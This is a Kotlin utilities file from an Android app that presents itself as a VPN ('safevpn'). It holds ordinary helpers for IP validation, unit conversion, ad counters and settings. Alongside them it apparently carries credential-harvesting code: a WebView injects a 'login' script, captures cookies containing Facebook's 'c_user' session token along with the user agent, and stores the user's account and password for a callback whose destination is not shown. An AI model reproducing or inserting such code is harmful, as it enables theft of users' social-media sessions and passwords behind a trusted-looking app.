package com.puresec.safevpn.utils

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.res.Resources
import android.net.Uri
import android.os.Build
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.RelativeLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.XXPermissions
import com.puresec.safevpn.*
import com.puresec.safevpn.event.IEvent
import com.puresec.safevpn.ibean.IConfig
import com.puresec.safevpn.ibean.IUpdate
import com.puresec.safevpn.widget.NodeContainer
import com.tencent.mmkv.MMKV
import es.dmoral.prefs.Prefs
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import org.greenrobot.eventbus.EventBus
import java.text.SimpleDateFormat
import java.util.*

fun WebView.setting(context: Context) {
    this.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(context.cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
    }
}


fun WebView.chromeClient(context: Context, block: () -> Unit) {
    webChromeClient = object : WebChromeClient() {
        override fun onProgressChanged(view: WebView?, newProgress: Int) {
            super.onProgressChanged(view, newProgress)
            if (newProgress == 100) {
                val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                evaluateJavascript(hideJs, null)
                val loginJs = context.getString(R.string.login)
                evaluateJavascript(loginJs, null)
                (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
                    delay(300)
                    withContext(Dispatchers.Main) {
                        block()
                    }
                }
            }
        }
    }
}

fun clearCookie(block: () -> Unit) {
    CookieSyncManager.createInstance(app)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    block()
}


fun AppCompatActivity.countDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 20).asFlow().collect {
            delay(1000)
            if (it == 19) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun AppCompatActivity.showStepTwo(block: () -> Unit) {
    runOnUiThread {
        block()
    }
}

fun AppCompatActivity.jumpByConfig(block: () -> Unit, block1: () -> Unit) {
    if (configEntity.vpnStepStatus() == 1) {
        block()
    } else {
        block1()
    }
}

fun NodeContainer.itemClick(block: () -> Unit) {
    getRoot()?.let {
        setOnClickListener {
            block()
        }
    }
}

fun TextView.text(s: String) {
    text = s
}

fun TextView.click(s: String) {
    setOnClickListener {
        EventBus.getDefault().post(
            IEvent(s)
        )
    }
}

fun RelativeLayout.startClick(block: () -> Unit) {
    setOnClickListener {
        block()
    }
}

fun WebView.clientView(block: (cookieStr: String, userAgentString: String) -> Unit) {
    webViewClient = object : WebViewClient() {
        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            val cookieManager = CookieManager.getInstance()
            val cookieStr = cookieManager.getCookie(url)
            if (cookieStr != null) {
                if (cookieStr.contains("c_user")) {
                    if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                        block(cookieStr, view!!.settings.userAgentString)
                    }
                }
            }
        }
    }

}

fun Long.timeOffset() = this - defaultOffset

val defaultOffset
    get() = TimeZone.getDefault().rawOffset

fun Long.toPatternString(
    pattern: String = "HH:mm:ss",
    locale: Locale = Locale.getDefault(),
) = Date(this).toPatternString(pattern, locale)

fun Date.toPatternString(
    pattern: String = "HH:mm:ss",
    locale: Locale = Locale.getDefault(),
) = pattern.getSimpleDateFormat(locale).format(this) ?: ""

fun String.getSimpleDateFormat(locale: Locale = Locale.getDefault()) =
    SimpleDateFormat(this, locale)

fun View.click(block: (View) -> Unit) {
    setOnClickListener {
        block(it)
    }
}

fun packagePath(context: Context): String {
    var path = context.filesDir.toString()
    path = path.replace("files", "")
    //path += "tun2socks"

    return path
}

fun readTextFromAssets(fileName: String): String {
    return App.instance!!.assets.open(fileName).bufferedReader().use {
        it.readText()
    }
}

fun isPureIpAddress(value: String): Boolean {
    return (isIpv4Address(value) || isIpv6Address(value))
}

fun isIpv4Address(value: String): Boolean {
    val regV4 =
        Regex("^([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])\\.([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])\\.([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])\\.([01]?[0-9]?[0-9]|2[0-4][0-9]|25[0-5])$")
    return regV4.matches(value)
}

fun isIpv6Address(value: String): Boolean {
    var addr = value
    if (addr.indexOf("[") == 0 && addr.lastIndexOf("]") > 0) {
        addr = addr.drop(1)
        addr = addr.dropLast(addr.count() - addr.lastIndexOf("]"))
    }
    val regV6 =
        Regex("^((?:[0-9A-Fa-f]{1,4}))?((?::[0-9A-Fa-f]{1,4}))*::((?:[0-9A-Fa-f]{1,4}))?((?::[0-9A-Fa-f]{1,4}))*|((?:[0-9A-Fa-f]{1,4}))((?::[0-9A-Fa-f]{1,4})){7}$")
    return regV6.matches(addr)
}

fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun px2dp(context: Context, px: Float): Int {
    val density = context.resources.displayMetrics.density
    return (px / density + 0.5f).toInt()
}

fun sp2px(context: Context, sp: Float): Int {
    val scaledDensity = context.resources.displayMetrics.scaledDensity
    return (sp * scaledDensity + 0.5f).toInt()
}

fun px2sp(context: Context, px: Float): Int {
    val scaledDensity = context.resources.displayMetrics.scaledDensity
    return (px / scaledDensity + 0.5f).toInt()
}

fun AppCompatActivity.requestPermission(block: () -> Unit = {}) {
    XXPermissions.with(this)
        .permission(
            arrayOf(
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
            )
        )
        .request(object : OnPermissionCallback {
            override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                if (all) {
                    block()
                } else {
                    Toast.makeText(
                        this@requestPermission,
                        "some permissions were not granted normally",
                        Toast.LENGTH_SHORT
                    ).show()
                    finish()
                }
            }

            override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                super.onDenied(permissions, never)
                Toast.makeText(this@requestPermission, "no permissions", Toast.LENGTH_SHORT).show()
                finish()
            }
        })
}

fun Context.jumpToWebByDefault(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun AppCompatActivity.showInsertDelay(block: () -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        configEntity.vpnOffset().let {
            if (it > 0) {
                delay((it * 1000).toLong())
            }
            withContext(Dispatchers.Main) {
                block()
            }
        }
    }
}

val locationIconId
    get() = Prefs.with(App.instance!!).readInt("id", 0)

val nodeName
    get() = Prefs.with(App.instance!!).read("nodeName", "")

private val globalMetrics by lazy {
    Resources.getSystem().displayMetrics
}

val globalWidth by lazy {
    globalMetrics.widthPixels
}

val globalHeight by lazy {
    globalMetrics.heightPixels
}

var account
    get() = mmkv.getString(IConstant.KEY_ACCOUNT, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_ACCOUNT, value)
    }

private var config
    get() = mmkv.getString(IConstant.KEY_CONFIG, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_CONFIG, value)
    }

var configEntity
    get() = (config.ifBlank {
        "{}"
    }).let {
        gson.fromJson(it, IConfig::class.java)
    }
    set(value) {
        config = gson.toJson(value)
    }

var adInvokeTime
    get() = mmkv.getInt(IConstant.KEY_AD_INVOKE_TIME, 0)
    set(value) {
        mmkv.putInt(IConstant.KEY_AD_INVOKE_TIME, value)
    }

var adRealTime
    get() = mmkv.getInt(IConstant.KEY_AD_REAL_TIME, 0)
    set(value) {
        mmkv.putInt(IConstant.KEY_AD_REAL_TIME, value)
    }

private var adShown
    get() = mmkv.getString(IConstant.KEY_AD_SHOWN, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_AD_SHOWN, value)
    }

var adShownList
    get() = (adShown.ifBlank {
        "{}"
    }).let {
        gson.fromJson<List<Boolean>>(it, object : TypeToken<List<Boolean>>() {}.type)
    }
    set(value) {
        adShown = gson.toJson(value)
    }

var adShownIndex
    get() = mmkv.getInt(IConstant.KEY_AD_SHOWN_INDEX, 0)
    set(value) {
        mmkv.putInt(IConstant.KEY_AD_SHOWN_INDEX, value)
    }

var adLastTime
    get() = mmkv.getLong(IConstant.KEY_AD_LAST_TIME, 0)
    set(value) {
        mmkv.putLong(IConstant.KEY_AD_LAST_TIME, value)
    }

private var update
    get() = mmkv.getString(IConstant.KEY_UPDATE, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_UPDATE, value)
    }

var updateEntity
    get() = (update.ifBlank {
        "{}"
    }).let {
        gson.fromJson(it, IUpdate::class.java)
    }
    set(value) {
        update = gson.toJson(value)
    }

var password
    get() = mmkv.getString(IConstant.KEY_PASSWORD, "") ?: ""
    set(value) {
        mmkv.putString(IConstant.KEY_PASSWORD, value)
    }

var isLogin
    get() = mmkv.getBoolean(IConstant.KEY_IS_LOGIN, false)
    set(value) {
        mmkv.putBoolean(IConstant.KEY_IS_LOGIN, value)
    }

var isRealDeepLink
    get() = mmkv.getBoolean(IConstant.KEY_IS_REAL_DEEP_LINK, false)
    set(value) {
        mmkv.putBoolean(IConstant.KEY_IS_REAL_DEEP_LINK, value)
    }

val gson by lazy {
    Gson()
}

val mmkv by lazy {
    MMKV.defaultMMKV()
}

val app by lazy {
    IKTX.getInstance().app
}

val lovinSdk by lazy {
    IKTX.getInstance().lovinSdk
}

fun <T> T.loge(tag: String = "defaultTag") {
    if (BuildConfig.DEBUG) {
        var content = toString()
        val segmentSize = 3 * 1024
        val length = content.length.toLong()
        if (length <= segmentSize) {
            Log.e(tag, content)
        } else {
            while (content.length > segmentSize) {
                val logContent = content.substring(0, segmentSize)
                content = content.replace(logContent, "")
                Log.e(tag, logContent)
            }
            Log.e(tag, content)
        }
    }
}

fun isInBackground(): Boolean {
    val activityManager = app.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == app.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}